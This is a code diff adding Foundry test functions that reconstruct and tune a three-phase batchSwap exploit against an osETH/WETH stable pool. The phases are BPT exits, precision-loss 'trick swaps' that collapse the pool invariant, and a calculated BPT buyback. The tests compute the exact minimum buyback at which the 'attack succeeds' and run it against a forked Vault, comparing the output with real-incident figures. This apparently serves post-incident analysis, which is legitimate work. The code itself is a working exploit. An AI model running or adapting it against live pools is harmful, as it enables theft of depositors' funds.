@@ -1638,6 +1638,8 @@ contract SearchParams is Test {
         console.log("[SP] bO after cycling:", bO);
 
         // Step 3: BPT buyback (per-token costs) - use debug version for per-step logging
+        // Use minimum bptTarget = minBuyback - warmupSum - 2 to test if attack still succeeds
+        // uint256 bptTarget = 11838483978630598473877;
         uint256 bptTarget = totalBPT * 10030 / 10000;
         (uint256 wethCostStep3, uint256 osethCostStep3, uint256 bptBought) =
             _simulateStep3RepaymentDetailedWithLog(bW, bO, bptTarget, postStep1Supply);
@@ -1646,6 +1648,7 @@ contract SearchParams is Test {
         console.log("[SP] Phase3 osETH cost:", osethCostStep3);
         console.log("WETH spent on buyback:", wethCostStep3);
         console.log("osETH spent on buyback:", osethCostStep3);
+        console.log("bptTarget:", bptTarget);
         console.log("BPT bought back:", bptBought);
         console.log("[SP] wethInternal after Phase3:", wethOut + wethGainStep2 - wethCostStep3);
         console.log("[SP] osethInternal after Phase3:", osethOut + osethGainStep2 - osethCostStep3);
@@ -1653,7 +1656,7 @@ contract SearchParams is Test {
         // Net token deltas: Phase1 extraction + Phase2 cycling gain - Phase3 buyback cost
         uint256 netWeth = wethOut + wethGainStep2 - wethCostStep3;
         uint256 netOseth = osethOut + osethGainStep2 - osethCostStep3;
-        uint256 netBpt = bptBought - bptSold;
+        int256 netBpt = int256(bptBought) - int256(bptSold);
 
         console.log("=== NET TOKEN DELTAS ===");
         console.log("Net WETH (wei):", netWeth);
@@ -1668,6 +1671,555 @@ contract SearchParams is Test {
         console.log("Real WETH:  6587.44 ETH");
         console.log("Real osETH: 6851.12 ETH");
         console.log("Real BPT:   44.15 ETH");
+    }
+
+    /// @notice Build Phase 2 trick swap steps (token↔token to collapse D).
+    /// Returns a BatchSwapStep array and the post-Phase2 simulated balances.
+    function _buildPhase2Steps(
+        bytes32 poolId,
+        uint256 initBalance,
+        uint256 trickAmt,
+        uint256 maxRounds
+    ) internal returns (IVault.BatchSwapStep[] memory steps, uint256 finalBalW, uint256 finalBalO) {
+        IVault.BatchSwapStep[] memory buffer = new IVault.BatchSwapStep[](maxRounds * 3);
+        uint256 stepCount = 0;
+
+        uint256 bW = initBalance;
+        uint256 bO = initBalance;
+        uint256 amount = bO;
+
+        for (uint256 round = 0; round < maxRounds; round++) {
+            // Swap 1: WETH→osETH, extract (amount - trickAmt - 1) of osETH
+            uint256 out1 = amount - trickAmt - 1;
+            uint256[] memory bal = new uint256[](2);
+            uint256[] memory sfs = new uint256[](2);
+            bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
+            bal = swapMath.getAfterSwapOutBalances(bal, sfs, 0, 1, out1, amp, swapFeePercentage);
+            bW = bal[0]; bO = bal[1];
+            buffer[stepCount++] = IVault.BatchSwapStep({
+                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: out1, userData: bytes("")
+            });
+
+            // Swap 2: WETH→osETH, extract trickAmt (precision loss trigger)
+            bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
+            bal = swapMath.getAfterSwapOutBalances(bal, sfs, 0, 1, trickAmt, amp, swapFeePercentage);
+            bW = bal[0]; bO = bal[1];
+            buffer[stepCount++] = IVault.BatchSwapStep({
+                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: trickAmt, userData: bytes("")
+            });
+
+            // Swap 3: osETH→WETH, extract truncated WETH balance
+            uint256 out3 = _truncateToTop2Digits(bW);
+            bool swapped = false;
+            for (uint256 j = 0; j < 3; j++) {
+                bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
+                try swapMath.getAfterSwapOutBalances(bal, sfs, 1, 0, out3, amp, swapFeePercentage)
+                    returns (uint256[] memory newBal)
+                {
+                    bW = newBal[0]; bO = newBal[1];
+                    buffer[stepCount++] = IVault.BatchSwapStep({
+                        poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: out3, userData: bytes("")
+                    });
+                    amount = bO;
+                    swapped = true;
+                    break;
+                } catch {
+                    out3 = out3 * 9 / 10;
+                }
+            }
+            require(swapped, "Phase2 swap3 failed");
+        }
+
+        // Trim buffer to actual step count
+        steps = new IVault.BatchSwapStep[](stepCount);
+        for (uint256 i = 0; i < stepCount; i++) steps[i] = buffer[i];
+        finalBalW = bW;
+        finalBalO = bO;
+    }
+
+    /// @notice Demonstrates that batchSwap reverts when Phase 3 buys back fewer BPT
+    /// than Phase 1 sold — includes all 3 phases with Phase 3 deliberately insufficient.
+    function test_batchSwapRevertOnInsufficientBptRepayment() public {
+        bytes32 poolId = OSETH_BPT.getPoolId();
+        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
+        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
+
+        uint256 remain = 67000;
+        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
+
+        // --- Phase 1: BPT → token exits ---
+        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
+        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
+        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
+        uint256 phase1Count = 0;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) phase1Count++;
+            if (i < osethCount) phase1Count++;
+        }
+
+        // --- Phase 2: trick swaps to collapse D ---
+        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);
+
+        // --- Phase 3: ONLY warmup steps (1e4 → 1e19), deliberately insufficient ---
+        // Total warmup = 1e4 + 1e7 + 1e10 + 1e13 + 1e16 + 1e19 ≈ 1.001e19 ≈ 10 BPT
+        // Phase 1 sold ≈ 11,848 BPT → massive shortfall
+        uint256 phase3Count = 6;
+        IVault.BatchSwapStep[] memory phase3Steps = new IVault.BatchSwapStep[](phase3Count);
+        uint256 warmupAmt = 1e4;
+        bool useAsset0 = true;
+        for (uint256 i = 0; i < phase3Count; i++) {
+            phase3Steps[i] = IVault.BatchSwapStep({
+                poolId: poolId,
+                assetInIndex: useAsset0 ? 0 : 2,
+                assetOutIndex: BptIndex,
+                amount: warmupAmt,
+                userData: bytes("")
+            });
+            warmupAmt = warmupAmt * 1e3;
+            useAsset0 = !useAsset0;
+        }
+
+        // --- Concatenate all phases ---
+        uint256 totalSteps = phase1Count + phase2Steps.length + phase3Count;
+        IVault.BatchSwapStep[] memory allSteps = new IVault.BatchSwapStep[](totalSteps);
+        uint256 idx = 0;
+
+        // Phase 1
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) {
+                allSteps[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
+                    amount: wethAmounts[i], userData: bytes("")
+                });
+            }
+            if (i < osethCount) {
+                allSteps[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
+                    amount: osethAmounts[i], userData: bytes("")
+                });
+            }
+        }
+        // Phase 2
+        for (uint256 i = 0; i < phase2Steps.length; i++) allSteps[idx++] = phase2Steps[i];
+        // Phase 3
+        for (uint256 i = 0; i < phase3Count; i++) allSteps[idx++] = phase3Steps[i];
+
+        // Approve & setup
+        for (uint256 i = 0; i < tokens.length; i++) {
+            tokens[i].approve(address(VAULT), type(uint256).max);
+        }
+        int256[] memory limits = new int256[](3);
+        limits[0] = type(int256).max;
+        limits[1] = type(int256).max;
+        limits[2] = type(int256).max;
+
+        IVault.FundManagement memory funds = IVault.FundManagement({
+            sender: address(this),
+            fromInternalBalance: false,
+            recipient: payable(address(this)),
+            toInternalBalance: false
+        });
+
+        console.log("=== batchSwap with insufficient BPT repayment ===");
+        console.log("Phase 1 steps:", phase1Count);
+        console.log("Phase 2 steps:", phase2Steps.length);
+        console.log("Phase 3 steps (warmup only):", phase3Count);
+        console.log("Test contract BPT balance:", IERC20(address(OSETH_BPT)).balanceOf(address(this)));
+
+        // Should revert with BAL#416 (TRANSFER_FROM_FAILED):
+        //   Phase 1 sells ~11,848 BPT → assetDeltas[BPT] ≈ +11,848
+        //   Phase 3 buys back only ~10 BPT (warmup only) → assetDeltas[BPT] ≈ +11,838
+        //   Settlement: Vault calls BPT.transferFrom(user, vault, 11838e18) → fails (user has 0 BPT)
+        vm.expectRevert();
+        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, allSteps, tokens, funds, limits, block.timestamp);
+        console.log("Reverted with BAL#416 (TRANSFER_FROM_FAILED) as expected");
+    }
+
+    /// @notice Find the exact minimum Phase 3 BPT buyback needed for the attack to succeed.
+    /// Uses queryBatchSwap to get the precise BPT delta from Phase 1+2, then compares
+    /// with the attacker's bptTarget formula.
+    function test_minimumPhase3Buyback() public {
+        bytes32 poolId = OSETH_BPT.getPoolId();
+        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
+        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
+        uint256 totalBPT = OSETH_BPT.getActualSupply();
+
+        uint256 remain = 67000;
+        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
+
+        // --- Phase 1 steps ---
+        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
+        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
+        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
+        uint256 phase1Count = 0;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) phase1Count++;
+            if (i < osethCount) phase1Count++;
+        }
+
+        // --- Phase 2 steps ---
+        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);
+
+        // --- Build Phase 1 + Phase 2 combined ---
+        uint256 totalP12 = phase1Count + phase2Steps.length;
+        IVault.BatchSwapStep[] memory stepsP12 = new IVault.BatchSwapStep[](totalP12);
+        uint256 idx = 0;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) {
+                stepsP12[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
+                    amount: wethAmounts[i], userData: bytes("")
+                });
+            }
+            if (i < osethCount) {
+                stepsP12[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
+                    amount: osethAmounts[i], userData: bytes("")
+                });
+            }
+        }
+        for (uint256 i = 0; i < phase2Steps.length; i++) stepsP12[idx++] = phase2Steps[i];
+
+        // Convert IERC20[] to address[] for queryBatchSwap
+        address[] memory assets = new address[](tokens.length);
+        for (uint256 i = 0; i < tokens.length; i++) assets[i] = address(tokens[i]);
+
+        IVault.FundManagement memory funds = IVault.FundManagement({
+            sender: address(this),
+            fromInternalBalance: false,
+            recipient: payable(address(this)),
+            toInternalBalance: false
+        });
+
+        // Query Phase 1+2 deltas
+        int256[] memory deltas = VAULT.queryBatchSwap(
+            IVault.SwapKind.GIVEN_OUT, stepsP12, assets, funds
+        );
+
+        int256 bptDelta = deltas[BptIndex]; // positive = user owes BPT
+        console.log("=== MINIMUM PHASE 3 BUYBACK ANALYSIS ===");
+        console.log("Phase 1+2 BPT delta (user owes):");
+        console.logInt(bptDelta);
+
+        // This BPT delta IS the minimum Phase 3 buyback needed
+        uint256 minBuyback = uint256(bptDelta);
+        console.log("Minimum Phase 3 BPT buyback:", minBuyback);
+
+        // Compare with simulation
+        (,, uint256 bptSold,) = _simulateStep1ExtractionDetailed(balances[0], balances[2], remain, totalBPT);
+        console.log("Simulation BPT sold (Phase 1):", bptSold);
+
+        // Compare with attacker's bptTarget formula
+        uint256 bptTarget = totalBPT * 10030 / 10000;
+        console.log("Attacker bptTarget (actualSupply*10030/10000):", bptTarget);
+        console.log("actualSupply:", totalBPT);
+
+        // Warmup sum from _generateStep3Amounts
+        uint256 warmupSum = 1e4 + 1e7 + 1e10 + 1e13 + 1e16 + 1e19;
+        console.log("Phase 3 warmup sum:", warmupSum);
+
+        // Total BPT bought = bptTarget + warmupSum + 2 (from _generateStep3Amounts)
+        uint256 totalBptBought = bptTarget + warmupSum + 2;
+        console.log("Total BPT bought (with warmup):", totalBptBought);
+
+        // Margin
+        console.log("=== MARGINS ===");
+        console.log("Margin: bptTarget - minBuyback =");
+        if (bptTarget > minBuyback) {
+            console.log("  +", bptTarget - minBuyback);
+        } else {
+            console.log("  -", minBuyback - bptTarget);
+        }
+        console.log("Margin: totalBptBought - minBuyback =");
+        console.log("  +", totalBptBought - minBuyback);
+
+        // Minimum bptTarget for _generateStep3Amounts (subtract warmup overhead)
+        uint256 minBptTarget = minBuyback > warmupSum + 2 ? minBuyback - warmupSum - 2 : 0;
+        console.log("Minimum bptTarget for simulation:", minBptTarget);
+        console.log("Actual bptTarget:", bptTarget);
+        console.log("Excess bptTarget:", bptTarget - minBptTarget);
+    }
+
+    /// @notice Use queryBatchSwap to verify whether the minimum bptTarget actually
+    /// settles the BPT debt. This calls the real Vault (read-only) so it captures
+    /// the true assetDeltas including protocol fees and rounding.
+    function test_queryBatchSwapWithMinBptTarget() public {
+        bytes32 poolId = OSETH_BPT.getPoolId();
+        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
+        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
+
+        uint256 remain = 67000;
+        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
+
+        // --- Phase 1 steps ---
+        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
+        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
+        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
+        uint256 phase1Count = 0;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) phase1Count++;
+            if (i < osethCount) phase1Count++;
+        }
+
+        // --- Phase 2 steps ---
+        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);
+
+        // --- Phase 3 steps with MINIMUM bptTarget ---
+        uint256 minBptTarget = 11838483978630598473877;
+        (uint256[] memory step3Amounts, uint256 step3Count) = _generateStep3Amounts(minBptTarget, 20);
+        uint256 phase3Count = step3Count;
+
+        // --- Concatenate all phases ---
+        uint256 totalSteps = phase1Count + phase2Steps.length + phase3Count;
+        IVault.BatchSwapStep[] memory allSteps = new IVault.BatchSwapStep[](totalSteps);
+        uint256 idx = 0;
+
+        // Phase 1
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) {
+                allSteps[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
+                    amount: wethAmounts[i], userData: bytes("")
+                });
+            }
+            if (i < osethCount) {
+                allSteps[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
+                    amount: osethAmounts[i], userData: bytes("")
+                });
+            }
+        }
+        // Phase 2
+        for (uint256 i = 0; i < phase2Steps.length; i++) allSteps[idx++] = phase2Steps[i];
+        // Phase 3: alternating WETH(0)/osETH(2) → BPT(1)
+        bool useAsset0 = true;
+        for (uint256 i = 0; i < phase3Count; i++) {
+            allSteps[idx++] = IVault.BatchSwapStep({
+                poolId: poolId,
+                assetInIndex: useAsset0 ? 0 : 2,
+                assetOutIndex: BptIndex,
+                amount: step3Amounts[i],
+                userData: bytes("")
+            });
+            useAsset0 = !useAsset0;
+        }
+
+        // Convert IERC20[] to address[] for queryBatchSwap
+        address[] memory assets = new address[](tokens.length);
+        for (uint256 i = 0; i < tokens.length; i++) assets[i] = address(tokens[i]);
+
+        IVault.FundManagement memory funds = IVault.FundManagement({
+            sender: address(this),
+            fromInternalBalance: false,
+            recipient: payable(address(this)),
+            toInternalBalance: false
+        });
+
+        // Query all 3 phases together
+        int256[] memory deltas = VAULT.queryBatchSwap(
+            IVault.SwapKind.GIVEN_OUT, allSteps, assets, funds
+        );
+
+        console.log("=== queryBatchSwap with MINIMUM bptTarget ===");
+        console.log("minBptTarget:", minBptTarget);
+        console.log("Phase 3 step count:", phase3Count);
+        console.log("Total steps:", totalSteps);
+        console.log("--- Asset Deltas ---");
+        console.log("WETH delta (index 0):");
+        console.logInt(deltas[0]);
+        console.log("BPT delta (index 1):");
+        console.logInt(deltas[1]);
+        console.log("osETH delta (index 2):");
+        console.logInt(deltas[2]);
+
+        // BPT delta > 0 means user still owes BPT → attack fails
+        // BPT delta <= 0 means user has surplus BPT → attack succeeds
+        if (deltas[1] > 0) {
+            console.log("RESULT: Attack FAILS - user still owes BPT to Vault");
+            console.log("BPT shortfall:", uint256(deltas[1]));
+        } else {
+            console.log("RESULT: Attack SUCCEEDS - user has BPT surplus");
+            console.log("BPT surplus:", uint256(-deltas[1]));
+        }
+
+        // Now test with minBptTarget + 2 (to cover the 1 wei gap)
+        uint256 minBptTargetPlus2 = minBptTarget + 2;
+        (uint256[] memory step3AmountsPlus, uint256 step3CountPlus) = _generateStep3Amounts(minBptTargetPlus2, 20);
+
+        totalSteps = phase1Count + phase2Steps.length + step3CountPlus;
+        IVault.BatchSwapStep[] memory allStepsPlus = new IVault.BatchSwapStep[](totalSteps);
+        idx = 0;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) {
+                allStepsPlus[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
+                    amount: wethAmounts[i], userData: bytes("")
+                });
+            }
+            if (i < osethCount) {
+                allStepsPlus[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
+                    amount: osethAmounts[i], userData: bytes("")
+                });
+            }
+        }
+        for (uint256 i = 0; i < phase2Steps.length; i++) allStepsPlus[idx++] = phase2Steps[i];
+        useAsset0 = true;
+        for (uint256 i = 0; i < step3CountPlus; i++) {
+            allStepsPlus[idx++] = IVault.BatchSwapStep({
+                poolId: poolId,
+                assetInIndex: useAsset0 ? 0 : 2,
+                assetOutIndex: BptIndex,
+                amount: step3AmountsPlus[i],
+                userData: bytes("")
+            });
+            useAsset0 = !useAsset0;
+        }
+
+        int256[] memory deltasPlus = VAULT.queryBatchSwap(
+            IVault.SwapKind.GIVEN_OUT, allStepsPlus, assets, funds
+        );
+
+        console.log("=== queryBatchSwap with minBptTarget + 2 ===");
+        console.log("minBptTarget+2:", minBptTargetPlus2);
+        console.log("BPT delta (index 1):");
+        console.logInt(deltasPlus[1]);
+        if (deltasPlus[1] > 0) {
+            console.log("RESULT: Attack FAILS - user still owes BPT");
+            console.log("BPT shortfall:", uint256(deltasPlus[1]));
+        } else {
+            console.log("RESULT: Attack SUCCEEDS - user has BPT surplus");
+            console.log("BPT surplus:", uint256(-deltasPlus[1]));
+        }
+    }
+
+    /// @notice Call real batchSwap with minimum bptTarget to confirm BAL#416 revert,
+    /// then call with minBptTarget+2 to confirm success.
+    function test_realBatchSwapMinBptTarget() public {
+        bytes32 poolId = OSETH_BPT.getPoolId();
+        uint256 BptIndex = OSETH_BPT.getBptIndex();
+        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
+
+        uint256 remain = 67000;
+        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
+
+        // --- Phase 1 steps ---
+        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
+        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
+        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
+        uint256 phase1Count = 0;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) phase1Count++;
+            if (i < osethCount) phase1Count++;
+        }
+
+        // --- Phase 2 steps ---
+        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);
+
+        // --- Phase 3 with MINIMUM bptTarget (should fail) ---
+        uint256 minBptTarget = 11838483978630598473877;
+        (uint256[] memory step3Amounts, uint256 step3Count) = _generateStep3Amounts(minBptTarget, 20);
+
+        IVault.BatchSwapStep[] memory allSteps = _assembleAllSteps(
+            poolId, BptIndex, wethAmounts, wethCount, osethAmounts, osethCount,
+            maxSwaps, phase2Steps, step3Amounts, step3Count
+        );
+
+        // Approve tokens
+        for (uint256 i = 0; i < tokens.length; i++) {
+            tokens[i].approve(address(VAULT), type(uint256).max);
+        }
+        // Give test contract plenty of WETH and osETH for settlement
+        deal(address(tokens[0]), address(this), 100000 ether);
+        deal(address(tokens[2]), address(this), 100000 ether);
+
+        int256[] memory limits = new int256[](3);
+        limits[0] = type(int256).max;
+        limits[1] = type(int256).max;
+        limits[2] = type(int256).max;
+
+        IVault.FundManagement memory funds = IVault.FundManagement({
+            sender: address(this),
+            fromInternalBalance: false,
+            recipient: payable(address(this)),
+            toInternalBalance: false
+        });
+
+        console.log("=== Real batchSwap with minBptTarget (should revert BAL#416) ===");
+        console.log("Test contract BPT balance:", IERC20(address(OSETH_BPT)).balanceOf(address(this)));
+        vm.expectRevert();
+        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, allSteps, tokens, funds, limits, block.timestamp);
+        console.log("Reverted as expected (BAL#416)");
+
+        // --- Phase 3 with minBptTarget + 2 (should succeed) ---
+        uint256 minBptTargetOk = minBptTarget + 2;
+        (uint256[] memory step3AmountsOk, uint256 step3CountOk) = _generateStep3Amounts(minBptTargetOk, 20);
+
+        IVault.BatchSwapStep[] memory allStepsOk = _assembleAllSteps(
+            poolId, BptIndex, wethAmounts, wethCount, osethAmounts, osethCount,
+            maxSwaps, phase2Steps, step3AmountsOk, step3CountOk
+        );
+
+        console.log("=== Real batchSwap with minBptTarget+2 (should succeed) ===");
+        int256[] memory result = VAULT.batchSwap(
+            IVault.SwapKind.GIVEN_OUT, allStepsOk, tokens, funds, limits, block.timestamp
+        );
+        console.log("batchSwap SUCCEEDED");
+        console.log("WETH delta:");
+        console.logInt(result[0]);
+        console.log("BPT delta:");
+        console.logInt(result[1]);
+        console.log("osETH delta:");
+        console.logInt(result[2]);
+    }
+
+    /// @dev Helper to assemble Phase1 + Phase2 + Phase3 steps into one array
+    function _assembleAllSteps(
+        bytes32 poolId, uint256 BptIndex,
+        uint256[] memory wethAmounts, uint256 wethCount,
+        uint256[] memory osethAmounts, uint256 osethCount,
+        uint256 maxSwaps,
+        IVault.BatchSwapStep[] memory phase2Steps,
+        uint256[] memory step3Amounts, uint256 step3Count
+    ) internal pure returns (IVault.BatchSwapStep[] memory) {
+        uint256 phase1Count = 0;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) phase1Count++;
+            if (i < osethCount) phase1Count++;
+        }
+        uint256 total = phase1Count + phase2Steps.length + step3Count;
+        IVault.BatchSwapStep[] memory steps = new IVault.BatchSwapStep[](total);
+        uint256 idx = 0;
+        // Phase 1
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) {
+                steps[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
+                    amount: wethAmounts[i], userData: bytes("")
+                });
+            }
+            if (i < osethCount) {
+                steps[idx++] = IVault.BatchSwapStep({
+                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
+                    amount: osethAmounts[i], userData: bytes("")
+                });
+            }
+        }
+        // Phase 2
+        for (uint256 i = 0; i < phase2Steps.length; i++) steps[idx++] = phase2Steps[i];
+        // Phase 3
+        bool useAsset0 = true;
+        for (uint256 i = 0; i < step3Count; i++) {
+            steps[idx++] = IVault.BatchSwapStep({
+                poolId: poolId,
+                assetInIndex: useAsset0 ? 0 : 2,
+                assetOutIndex: BptIndex,
+                amount: step3Amounts[i],
+                userData: bytes("")
+            });
+            useAsset0 = !useAsset0;
+        }
+        return steps;
     }
 }
 
